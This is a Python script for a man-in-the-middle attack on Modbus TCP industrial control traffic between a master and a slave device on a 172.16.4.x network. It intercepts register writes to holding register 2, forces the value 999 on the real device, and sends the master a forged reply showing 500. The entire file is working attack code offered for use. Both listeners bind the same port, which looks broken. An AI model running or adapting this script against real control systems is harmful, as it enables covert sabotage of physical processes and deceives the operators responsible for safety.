#!/usr/bin/env python3

import socket
import threading
import struct
import time
from pymodbus.client import ModbusTcpClient

# Network configuration
MASTER_LISTEN_IP = "0.0.0.0"  # Lyt på alle interfaces
SLAVE_LISTEN_IP = "0.0.0.0"
MITM_PORT = 502

# Real endpoints
REAL_MASTER_IP = "172.16.4.50"
REAL_SLAVE_IP = "172.16.4.51"

TARGET_REGISTER = 2
FORCED_VALUE = 999
MASTER_SEES_VALUE = 500

# Global clients for manipulation
slave_client = None

def handle_client(client_sock, src_addr, target_ip):
    """Håndter en enkelt client forbindelse og proxy til target"""
    print(f"[+] New connection from {src_addr} -> {target_ip}:{MITM_PORT}")
    
    try:
        # Connect til real target
        target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        target_sock.settimeout(5)
        target_sock.connect((target_ip, MITM_PORT))
        print(f"[+] Connected to real {target_ip}")
    except Exception as e:
        print(f"[!] Failed to connect to {target_ip}: {e}")
        client_sock.close()
        return
    
    try:
        # Bi-directional proxy med manipulation
        while True:
            # Read fra client
            data = client_sock.recv(1024)
            if not data:
                break
            
            print(f"[{src_addr[0]}->proxy] {len(data)} bytes")
            
            # Check om det er Modbus Write Single Register (FC=06) til vores target
            if len(data) >= 8 and data[7] == 0x06 and struct.unpack('>H', data[8:10])[0] == TARGET_REGISTER:
                print(f"[MITM DETECTED] Write to HR[{TARGET_REGISTER}] = {struct.unpack('>H', data[10:12])[0]}")
                
                # Send FORCED_VALUE til real slave i stedet
                if target_ip == REAL_SLAVE_IP and slave_client and slave_client.connected:
                    slave_client.write_register(TARGET_REGISTER, FORCED_VALUE)
                    print(f"[+] Forced {FORCED_VALUE} to real slave")
                
                # Fake svar til client (master ser 500)
                fake_response = data[:8] + struct.pack('>HH', TARGET_REGISTER, MASTER_SEES_VALUE) + data[12:]
                client_sock.send(fake_response)
                print(f"[+] Fake response sent: {MASTER_SEES_VALUE}")
                target_sock.close()
                client_sock.close()
                return
            
            # Normal proxy
            target_sock.send(data)
            
            # Read svar fra target og send til client
            response = target_sock.recv(1024)
            if response:
                client_sock.send(response)
                print(f"[proxy->{src_addr[0]}] {len(response)} bytes")
                
    except Exception as e:
        print(f"[!] Proxy error: {e}")
    finally:
        client_sock.close()
        target_sock.close()

def master_proxy():
    """Proxy for connections fra master (lyt på 172.16.4.50:502)"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((MASTER_LISTEN_IP, MITM_PORT))
    server.listen(5)
    print(f"[+] MASTER proxy listening on {MASTER_LISTEN_IP}:{MITM_PORT} -> {REAL_SLAVE_IP}")
    
    while True:
        client_sock, addr = server.accept()
        target_thread = threading.Thread(
            target=handle_client, 
            args=(client_sock, addr, REAL_SLAVE_IP)
        )
        target_thread.daemon = True
        target_thread.start()

def slave_proxy():
    """Proxy for connections fra slave (lyt på 172.16.4.51:502)"""  
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((SLAVE_LISTEN_IP, MITM_PORT))
    server.listen(5)
    print(f"[+] SLAVE proxy listening on {SLAVE_LISTEN_IP}:{MITM_PORT} -> {REAL_MASTER_IP}")
    
    while True:
        client_sock, addr = server.accept()
        target_thread = threading.Thread(
            target=handle_client, 
            args=(client_sock, addr, REAL_MASTER_IP)
        )
        target_thread.daemon = True
        target_thread.start()

def init_manipulation_client():
    """Init PyModbus client til manipulation af slave"""
    global slave_client
    slave_client = ModbusTcpClient(REAL_SLAVE_IP, port=MITM_PORT, timeout=3)
    if slave_client.connect():
        print(f"[+] Manipulation client connected to slave {REAL_SLAVE_IP}")
    else:
        print(f"[!] Could not connect manipulation client to slave")

def main():
    print("=== OT Modbus MITM Socket Proxy (100% Compatible) ===")
    print(f"Master proxy: {MASTER_LISTEN_IP}:{MITM_PORT} -> {REAL_SLAVE_IP}:{MITM_PORT}")
    print(f"Slave proxy:  {SLAVE_LISTEN_IP}:{MITM_PORT} -> {REAL_MASTER_IP}:{MITM_PORT}")
    print(f"HR[{TARGET_REGISTER}] manipulation: real={FORCED_VALUE}, master_sees={MASTER_SEES_VALUE}")
    print()
    
    # Start manipulation client
    init_manipulation_client()
    
    # Start proxy servers
    master_thread = threading.Thread(target=master_proxy)
    slave_thread = threading.Thread(target=slave_proxy)
    
    master_thread.daemon = True
    slave_thread.daemon = True
    
    master_thread.start()
    slave_thread.start()
    
    try:
        print("[*] MITM proxies running on all interfaces:502! (Ctrl+C to stop)")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Shutting down...")
        if slave_client:
            slave_client.close()

if __name__ == "__main__":
    main()